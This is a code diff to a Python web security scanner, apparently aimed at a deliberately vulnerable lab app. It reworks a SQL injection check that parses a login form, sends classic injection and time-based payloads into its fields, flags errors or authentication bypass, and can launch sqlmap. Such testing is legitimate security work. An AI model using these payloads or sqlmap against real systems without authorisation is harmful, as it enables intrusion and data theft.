@@ -3,7 +3,7 @@ import json
 import subprocess
 import time
 from urllib.parse import urljoin, urlparse
-
+from bs4 import BeautifulSoup
 import requests
 
 
@@ -157,70 +157,203 @@ def check_idor(base):
     )
 
 
+SQL_ERRORS = [
+    "SQL syntax",
+    "mysql_fetch",
+    "ORA-",
+    "PostgreSQL",
+    "SQLite",
+    "SQLException"
+]
+
+
+def extract_login_form(url):
+    r = requests.get(url, timeout=5, verify=False)
+
+    soup = BeautifulSoup(r.text, "html.parser")
+
+    form = soup.find("form")
+    if not form:
+        return None
+
+    action = form.get("action", "")
+    method = form.get("method", "GET").upper()
+
+    inputs = form.find_all("input")
+
+    params = []
+
+    for i in inputs:
+        name = i.get("name")
+        input_type = i.get("type", "text")
+
+        if name:
+            params.append({
+                "name": name,
+                "type": input_type
+            })
+
+    return {
+        "action": urljoin(url, action),
+        "method": method,
+        "params": params
+    }
+
+
 def check_sqli(base, run_sqlmap=False):
     path = "/vulnapp/login.jsp"
-    url = urljoin(base, path)
+    login_url = urljoin(base, path)
 
     payloads = [
         "' OR '1'='1",
         "' OR 1=1 -- ",
         "\" OR \"1\"=\"1",
-        "' AND SLEEP(2)-- "
+        "' AND SLEEP(3)-- "
     ]
 
+    form_info = extract_login_form(login_url)
+
+    if not form_info:
+        return result(
+            "WEB-003",
+            "A03:2021 Injection",
+            "SQL Injection",
+            path,
+            False,
+            "form not found",
+            "info"
+        )
+
     findings = []
-    suspected = False
 
-    for p in payloads:
+    for payload in payloads:
+        data = {}
+
+        for p in form_info["params"]:
+            pname = p["name"]
+            ptype = p.get("type", "text").lower()
+
+            if ptype in ["text", "password", "email", "search"]:
+                data[pname] = payload
+            elif ptype == "hidden":
+                data[pname] = "test"
+            elif ptype == "submit":
+                continue
+            else:
+                data[pname] = "test"
+
         start = time.time()
-        r = req("POST", url, data={"username": p, "password": p})
-        elapsed = time.time() - start
 
-        if isinstance(r, dict):
+        try:
+            if form_info["method"] == "POST":
+                r = requests.post(
+                    form_info["action"],
+                    data=data,
+                    headers=HEADERS,
+                    timeout=10,
+                    verify=False,
+                    allow_redirects=False
+                )
+            else:
+                r = requests.get(
+                    form_info["action"],
+                    params=data,
+                    headers=HEADERS,
+                    timeout=10,
+                    verify=False,
+                    allow_redirects=False
+                )
+
+        except Exception as e:
+            findings.append({
+                "payload": payload,
+                "error": str(e)
+            })
             continue
 
+        elapsed = time.time() - start
         body = r.text[:3000]
-        error_hit = [e for e in SQL_ERRORS if e.lower() in body.lower()]
-        auth_bypass = r.status_code == 200 and any(k in body.lower() for k in ["welcome", "admin", "logout"])
-        time_based = elapsed > 2
+
+        error_hit = [
+            e for e in SQL_ERRORS
+            if e.lower() in body.lower()
+        ]
+
+        auth_bypass = (
+            r.status_code == 200 and
+            any(k in body.lower() for k in ["welcome", "logout", "admin", "dashboard"])
+        )
+
+        time_based = elapsed > 3
 
         if error_hit or auth_bypass or time_based:
-            suspected = True
             findings.append({
-                "payload": p,
+                "payload": payload,
+                "data": data,
                 "status": r.status_code,
                 "elapsed": round(elapsed, 2),
                 "error_hit": error_hit,
-                "auth_bypass_hint": auth_bypass
+                "auth_bypass": auth_bypass,
+                "time_based": time_based
             })
 
-    sqlmap_output = None
+    suspected = len(findings) > 0
+    sqlmap_result = None
+
     if suspected and run_sqlmap:
+        param_names = [
+            p["name"]
+            for p in form_info["params"]
+            if p.get("name") and p.get("type", "text").lower() != "submit"
+        ]
+
+        data_str = "&".join([
+            f"{name}=test"
+            for name in param_names
+        ])
+
         cmd = [
             "sqlmap",
-            "-u", url,
-            "--data", "username=test&password=test",
-            "-p", "username,password",
+            "-u", form_info["action"],
             "--batch",
             "--level", "2",
             "--risk", "1"
         ]
+
+        if form_info["method"] == "POST":
+            cmd.extend(["--data", data_str])
+        else:
+            if "?" in form_info["action"]:
+                sqlmap_url = form_info["action"] + "&" + data_str
+            else:
+                sqlmap_url = form_info["action"] + "?" + data_str
+
+            cmd[2] = sqlmap_url
 
         try:
             proc = subprocess.run(
                 cmd,
                 capture_output=True,
                 text=True,
-                timeout=120
+                timeout=180
             )
-            sqlmap_output = {
-                "cmd": " ".join(cmd),
+
+            sqlmap_result = {
+                "command": " ".join(cmd),
                 "returncode": proc.returncode,
-                "stdout_tail": proc.stdout[-4000:],
+                "stdout_tail": proc.stdout[-5000:],
                 "stderr_tail": proc.stderr[-2000:]
             }
+
+        except FileNotFoundError:
+            sqlmap_result = {
+                "error": "sqlmap not installed or not in PATH"
+            }
+
         except Exception as e:
-            sqlmap_output = {"error": str(e)}
+            sqlmap_result = {
+                "error": str(e)
+            }
 
     return result(
         "WEB-003",
@@ -228,11 +361,14 @@ def check_sqli(base, run_sqlmap=False):
         "SQL Injection",
         path,
         suspected,
-        {"findings": findings, "sqlmap": sqlmap_output},
+        {
+            "login_url": login_url,
+            "form": form_info,
+            "findings": findings,
+            "sqlmap": sqlmap_result
+        },
         "critical" if suspected else "info"
     )
-
-
 def check_xss(base):
     path = "/vulnapp/search.jsp"
     url = urljoin(base, path)
